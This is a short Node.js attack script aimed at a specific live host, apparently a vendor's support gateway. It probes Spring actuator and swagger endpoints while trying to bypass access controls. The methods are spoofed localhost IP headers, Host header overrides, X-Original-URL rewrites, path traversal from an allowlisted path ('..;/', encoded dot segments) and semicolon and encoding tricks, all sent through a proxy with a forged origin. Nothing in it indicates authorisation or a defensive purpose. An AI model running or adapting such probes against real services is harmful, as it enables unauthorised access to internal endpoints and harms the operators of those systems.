const {ProxyAgent, fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const B='https://oepa.bblops.com';
const ipHeaders={
 'X-Forwarded-For':'127.0.0.1','X-Real-IP':'127.0.0.1','X-Client-IP':'127.0.0.1','CF-Connecting-IP':'127.0.0.1','True-Client-IP':'127.0.0.1','X-Originating-IP':'127.0.0.1','X-Remote-IP':'127.0.0.1','X-Remote-Addr':'127.0.0.1','Forwarded':'for=127.0.0.1;proto=https','X-Forwarded-Host':'127.0.0.1','X-Forwarded-Prefix':'/','X-Original-URL':'/csm/gateway/actuator/health','X-Rewrite-URL':'/csm/gateway/actuator/health'
};
async function req(label,path,opts={}){try{const r=await fetch(B+path,{method:opts.method||'GET',headers:{'user-agent':UA,origin:'https://support.bambulab.com',accept:'*/*',...(opts.headers||{})},body:opts.body,dispatcher:d,signal:AbortSignal.timeout(15000)});const t=await r.text();console.log(r.status,label,'|',t.slice(0,160).replace(/\s+/g,' '));}catch(e){console.log('ERR',label,e.message)}}
(async()=>{
 const paths=['/csm/gateway/actuator/health','/csm/gateway/actuator','/csm/gateway/swagger-ui/index.html','/csm/gateway/v3/api-docs'];
 for(const p of paths){await req('baseline '+p,p);await req('ipheaders '+p,p,{headers:ipHeaders});await req('host-localhost '+p,p,{headers:{Host:'localhost'}});await req('host-127 '+p,p,{headers:{Host:'127.0.0.1'}});}
 console.log('--- traversal from allowlisted /cus ---');
 for(const p of ['/csm/gateway/cus/../actuator/health','/csm/gateway/cus/%2e%2e/actuator/health','/csm/gateway/cus/..%2factuator/health','/csm/gateway/cus/%2e%2e%2factuator/health','/csm/gateway/cus/..;/actuator/health','/csm/gateway/cus/actuator/health','/csm/gateway/cus/../swagger-ui/index.html']){await req('traversal '+p,p);await req('traversal+ip '+p,p,{headers:ipHeaders});}
 console.log('--- absolute/odd targets ---');
 await req('double-slash','//csm/gateway/actuator/health');
 await req('dot-seg','/csm/gateway/./actuator/health');
 await req('semicolon','/csm/gateway/actuator/health;.js');
 await req('encoded','/csm/gateway/%61ctuator/health');
})();
